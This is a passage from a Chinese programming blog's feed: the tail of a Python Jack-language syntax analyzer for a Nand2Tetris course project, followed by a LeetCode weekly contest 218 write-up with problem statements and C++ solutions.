class="keyword">and</span> self.parser.symbol() == <span class="string">"."</span>:</span><br><span class="line">                <span class="comment"># parse '.'</span></span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse subroutineName</span></span><br><span class="line">                <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">                    self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">"valid term define!\n"</span>)</span><br><span class="line">                    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse '('</span></span><br><span class="line">                <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">"("</span>:</span><br><span class="line">                    self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">"valid term define!\n"</span>)</span><br><span class="line">                    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse expressList</span></span><br><span class="line">                self.compileExpressionList()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse ')'</span></span><br><span class="line">                <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">")"</span>:</span><br><span class="line">                    self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">"valid term define!\n"</span>)</span><br><span class="line">                    exit(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">"("</span>:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse expressList</span></span><br><span class="line">                self.compileExpressionList()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse ')'</span></span><br><span class="line">                <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">")"</span>:</span><br><span class="line">                    self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">"valid term define!\n"</span>)</span><br><span class="line">                    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/term&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileExpressionList</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;expressionList&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.parser.symbol() == <span class="string">')'</span> <span class="keyword">and</span> \</span><br><span class="line">           self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">            self.upperLevel()</span><br><span class="line">            self.compileOut(<span class="string">"&lt;/expressionList&gt;\n"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse expression</span></span><br><span class="line">        self.compileExpression()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse `, expression`</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.symbol() == <span class="string">','</span> <span class="keyword">and</span> \</span><br><span class="line">              self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">            <span class="comment"># parse ','</span></span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">            <span class="comment"># parse expression</span></span><br><span class="line">            self.compileExpression()</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/expressionList&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(input)</span>:</span></span><br><span class="line">    parser = CompilationEngine(input)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure></li></ul><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;week9&quot;&gt;&lt;a href=&quot;#week9&quot; class=&quot;headerlink&quot; title=&quot;week9&quot;&gt;&lt;/a&gt;week9&lt;/h1&gt;&lt;p&gt;目前已经开始了&lt;code&gt;build a computer&lt;/code&gt;系列的最后几章了，后面的章节感觉越来越难，&lt;code&gt;build a computer&lt;/code&gt;的&lt;code&gt;part II&lt;/code&gt;部分基本上全是软件，需要编码，耗费大量的实践和精力来应付这些代码，不过能够最终通过测试的话还是成就满满。特别是只剩下后面三章了，主要是完成一个&lt;code&gt;jack&lt;/code&gt;语言编译器和一个最基本的微型操作系统，并提供基本的系统库函数。&lt;code&gt;project10&lt;/code&gt;主要完成&lt;code&gt;jack&lt;/code&gt;语言编译器的语法分析，感觉还是非常有难度和挑战的，花了差不多两周时间，利用子集的业余时间终于把蹩脚的语法解析器完成了，主要是关于&lt;code&gt;jack&lt;/code&gt;语言的语法分析。收获满满，最终的实现结果是将&lt;code&gt;jack&lt;/code&gt;语言的语法分析结果结构化为固定的&lt;code&gt;xml&lt;/code&gt;文档，供后面的代码生成器和链接器使用。当然总体来说&lt;code&gt;jack&lt;/code&gt;语言的语法还是非常简单的语法，我们直接用常见的&lt;code&gt;top down&lt;/code&gt;递归下降分析法即可实现，实际是非常简单的语法，至少感觉总体语法来说比&lt;code&gt;c&lt;/code&gt;语言的语法简单多了，非常喜欢这类有挑战性的小&lt;code&gt;project&lt;/code&gt;，感觉对基本的递归方法有了更深层次的了解。&lt;/p&gt;
    
    </summary>
    
    
      <category term="build a computer" scheme="http://yoursite.com/categories/build-a-computer/"/>
    
    
      <category term="coursera" scheme="http://yoursite.com/tags/coursera/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】  周赛 218场</title>
    <link href="http://yoursite.com/2020/12/06/232/"/>
    <id>http://yoursite.com/2020/12/06/232/</id>
    <published>2020-12-06T11:10:53.400Z</published>
    <updated>2020-12-06T13:06:18.593Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-contest-218"><a href="#leetcode-contest-218" class="headerlink" title="leetcode   contest 218"></a>leetcode   contest 218</h1><p>本周周赛最后一题果真是惯例题目，只做出来前三道题目，最后一题的状态压缩<code>dp</code>还是比较有难度的题目，需要进行优化。</p><h2 id="5617-设计-Goal-解析器"><a href="#5617-设计-Goal-解析器" class="headerlink" title="5617. 设计 Goal 解析器"></a>5617. 设计 Goal 解析器</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>请你设计一个可以解释字符串 <code>command</code>的 <code>Goal</code> 解析器 。<code>command</code>由 <code>&quot;G&quot;、&quot;()&quot;</code>和/或 <code>&quot;(al)&quot;</code>按某种顺序组成。<code>Goal</code> 解析器会将 <code>&quot;G&quot;</code> 解释为字符串<code>&quot;G&quot;、&quot;()&quot;</code>解释为字符串<code>&quot;o&quot; ，&quot;(al)&quot;</code>解释为字符串 “al” 。然后，按原顺序将经解释得到的字符串连接成一个字符串。</p><a id="more"></a><p>给你字符串 <code>command</code> ，返回 <code>Goal</code>解析器 对 <code>command</code> 的解释结果。</p><p>示例 1：<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：command = <span class="string">"G()(al)"</span></span><br><span class="line">输出：<span class="string">"Goal"</span></span><br><span class="line">解释：Goal 解析器解释命令的步骤如下所示：</span><br><span class="line">G<span class="function"> -&gt;</span> G</span><br><span class="line"><span class="function"><span class="params">()</span> -&gt;</span> o</span><br><span class="line"><span class="function"><span class="params">(al)</span> -&gt;</span> al</span><br><span class="line">最后连接得到的结果是 <span class="string">"Goal"</span></span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="keyword">command</span> = <span class="string">"G()()()()(al)"</span></span><br><span class="line">输出：<span class="string">"Gooooal"</span></span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="keyword">command</span> = <span class="string">"(al)G(al)()()G"</span></span><br><span class="line">输出：<span class="string">"alGalooG"</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= command.length &lt;= 100</code></li><li><code>command</code> 由 <code>&quot;G&quot;、&quot;()&quot;</code>和/或 <code>&quot;(al)&quot;</code>按某种顺序组成</li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/richest-customer-wealth" target="_blank" rel="noopener">https://leetcode-cn.com/problems/richest-customer-wealth</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  栈即可</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>暴力<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">interpret</span><span class="params">(<span class="built_in">string</span> command)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">stack</span>&lt;<span class="keyword">char</span>&gt; op;</span><br><span class="line">        <span class="built_in">string</span> ans;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c : command)&#123;</span><br><span class="line">            <span class="keyword">if</span>( c == <span class="string">'G'</span>)&#123;</span><br><span class="line">                ans.push_back(<span class="string">'G'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">'('</span>)&#123;</span><br><span class="line">                op.push(<span class="string">'('</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">'a'</span> || c == <span class="string">'l'</span>)&#123;</span><br><span class="line">                op.push(c);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">')'</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(op.size() &gt; <span class="number">1</span>)&#123;</span><br><span class="line">                    ans.push_back(<span class="string">'a'</span>);</span><br><span class="line">                    ans.push_back(<span class="string">'l'</span>);</span><br><span class="line">                    op.pop();</span><br><span class="line">                    op.pop();</span><br><span class="line">                    op.pop();</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(op.size() == <span class="number">1</span>)&#123;</span><br><span class="line">                    op.pop();</span><br><span class="line">                    ans.push_back(<span class="string">'o'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5618-K-和数对的最大数目"><a href="#5618-K-和数对的最大数目" class="headerlink" title="5618. K 和数对的最大数目"></a>5618. K 和数对的最大数目</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>给你一个整数数组 <code>nums</code> 和一个整数 <code>k</code>。</p><p>每一步操作中，你需要从数组中选出和为 <code>k</code>的两个整数，并将它们移出数组。</p><p>返回你可以对数组执行的最大操作数。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>], k = <span class="number">5</span></span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：开始时 nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]：</span><br><span class="line">- 移出 <span class="number">1</span> 和 <span class="number">4</span> ，之后 nums = [<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">- 移出 <span class="number">2</span> 和 <span class="number">3</span> ，之后 nums = []</span><br><span class="line">不再有和为 <span class="number">5</span> 的数对，因此最多执行 <span class="number">2</span> 次操作。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">3</span>], k = <span class="number">6</span></span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：开始时 nums = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">3</span>]：</span><br><span class="line">- 移出前两个 <span class="number">3</span> ，之后nums = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>]</span><br><span class="line">不再有和为 <span class="number">6</span> 的数对，因此最多执行 <span class="number">1</span> 次操作。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= nums.length &lt;= 105</code></li><li><code>1 &lt;= nums[i] &lt;= 109</code></li><li><code>1 &lt;= k &lt;= 109</code></li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/max-number-of-k-sum-pairs" target="_blank" rel="noopener">https://leetcode-cn.com/problems/max-number-of-k-sum-pairs</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 双指针或者<code>hash</code></p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>常规题目，双指针或者hash统计数字的数目即可。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3></li></ol><ul><li>单调栈<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxOperations</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> r = n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        sort(nums.begin(),nums.end());</span><br><span class="line">        <span class="keyword">while</span>(l &lt; r)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[l] + nums[r] &gt; k) r--;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[l] + nums[r] &lt; k) l++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[l] + nums[r] == k)&#123;</span><br><span class="line">                ans++;</span><br><span class="line">                l++;</span><br><span class="line">                r--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></blockquote><h2 id="5620-连接连续二进制数字"><a href="#5620-连接连续二进制数字" class="headerlink" title="5620. 连接连续二进制数字"></a>5620. 连接连续二进制数字</h2><p>给你一个整数 <code>n</code> ，请你将 1 到 <code>n</code>的二进制表示连接起来，并返回连接结果对应的 十进制 数字对 109 + 7 取余的结果。</p><p>示例 1：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">1</span></span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：二进制的 <span class="string">"1"</span> 对应着十进制的 <span class="number">1</span> 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">3</span></span><br><span class="line">输出：<span class="number">27</span></span><br><span class="line">解释：二进制下，<span class="number">1</span>，<span class="number">2</span> 和 <span class="number">3</span> 分别对应 <span class="string">"1"</span> ，<span class="string">"10"</span> 和 <span class="string">"11"</span> 。</span><br><span class="line">将它们依次连接，我们得到 <span class="string">"11011"</span> ，对应着十进制的 <span class="number">27</span> 。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">12</span></span><br><span class="line">输出：<span class="number">505379714</span></span><br><span class="line">解释：连接结果为 <span class="string">"1101110010111011110001001101010111100"</span> 。</span><br><span class="line">对应的十进制数字为 <span class="number">118505380540</span> 。</span><br><span class="line">对 <span class="number">109</span> + <span class="number">7</span> 取余后，结果为 <span class="number">505379714</span> 。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= n &lt;= 105</code></li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/concatenation-of-consecutive-binary-numbers" target="_blank" rel="noopener">https://leetcode-cn.com/problems/concatenation-of-consecutive-binary-numbers</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 打表或者数学法。</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>查表法，我们实际可以知道最终目标数的二进制的每一位数，我们将其二进制数相加然后取模即可。<script type="math/tex; mode=display">ans = (\sum_{i=0}^{n-1}b_{i}*2^{i})\%(10^{9}+7)</script>我们可以提前求出所有的$t_{i} = 2^{i}\%(10^{9}+7)$得值，因为我们知道递推公式如下：<script type="math/tex; mode=display">t_{0} = 1 \\t_{1} = 2 \\....\\t_{n} = (2*t_{n-1})\%(10^{9}+7) \\</script></li><li>递推公式:<script type="math/tex; mode=display">f[n] = f[n-1]<<bit(n) + n</script><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">concatenatedBinary</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i&lt;=n; i++)&#123;</span><br><span class="line">            res = (res &lt;&lt; getbit(i)) + i;</span><br><span class="line">            res = res % MOD;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> MOD = <span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getbit</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(n&gt;&gt;=<span class="number">1</span>)</span><br><span class="line">            res++;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> dp[<span class="number">2000001</span>];</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">concatenatedBinary</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> curr = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">        </span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n*<span class="number">20</span>; ++i)&#123;</span><br><span class="line">            dp[i] = (dp[i<span class="number">-1</span>]*<span class="number">2</span>)%mod;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; --i)&#123;</span><br><span class="line">            <span class="keyword">int</span> curr = i;</span><br><span class="line">            <span class="keyword">while</span>(curr)&#123;</span><br><span class="line">                l++;</span><br><span class="line">                <span class="keyword">if</span>(curr%<span class="number">2</span>)&#123;</span><br><span class="line">                    ans = (ans + dp[l])%mod;</span><br><span class="line">                &#125;</span><br><span class="line">                curr = curr&gt;&gt;<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5619-最小不兼容性"><a href="#5619-最小不兼容性" class="headerlink" title="5619. 最小不兼容性"></a>5619. 最小不兼容性</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给你一个整数数组 <code>nums​​​</code>和一个整数 <code>k</code> 。你需要将这个数组划分到<code>k</code>个相同大小的子集中，使得同一个子集里面没有两个相同的元素。</p><p>一个子集的 不兼容性 是该子集里面最大值和最小值的差。</p><p>请你返回将数组分成 <code>k</code>个子集后，各子集 不兼容性 的 和 的 最小值 ，如果无法分成分成 k 个子集，返回 -1 。</p><p>子集的定义是数组中一些数字的集合，对数字顺序没有要求。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>], k = <span class="number">2</span></span><br><span class="line">输出：<span class="number">4</span></span><br><span class="line">解释：最优的分配是 [<span class="number">1</span>,<span class="number">2</span>] 和 [<span class="number">1</span>,<span class="number">4</span>] 。</span><br><span class="line">不兼容性和为 (<span class="number">2</span><span class="number">-1</span>) + (<span class="number">4</span><span class="number">-1</span>) = <span class="number">4</span> 。</span><br><span class="line">注意到 [<span class="number">1</span>,<span class="number">1</span>] 和 [<span class="number">2</span>,<span class="number">4</span>] 可以得到更小的和，但是第一个集合有 <span class="number">2</span> 个相同的元素，所以不可行。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">6</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>], k = <span class="number">4</span></span><br><span class="line">输出：<span class="number">6</span></span><br><span class="line">解释：最优的子集分配为 [<span class="number">1</span>,<span class="number">2</span>]，[<span class="number">2</span>,<span class="number">3</span>]，[<span class="number">6</span>,<span class="number">8</span>] 和 [<span class="number">1</span>,<span class="number">3</span>] 。</span><br><span class="line">不兼容性和为 (<span class="number">2</span><span class="number">-1</span>) + (<span class="number">3</span><span class="number">-2</span>) + (<span class="number">8</span><span class="number">-6</span>) + (<span class="number">3</span><span class="number">-1</span>) = <span class="number">6</span> 。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">3</span>], k = <span class="number">3</span></span><br><span class="line">输出：<span class="number">-1</span></span><br><span class="line">解释：没办法将这些数字分配到 <span class="number">3</span> 个子集且满足每个子集里没有相同数字。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= k &lt;= nums.length &lt;= 16</code></li><li><code>nums.length</code> 能被 <code>k</code> 整除。</li><li><code>1 &lt;= nums[i] &lt;= nums.length</code></li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/minimum-incompatibility" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-incompatibility</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 状态压缩<code>dp</code>和子集枚举 </p><h3 id="解题思路"><a href="#解题思路" 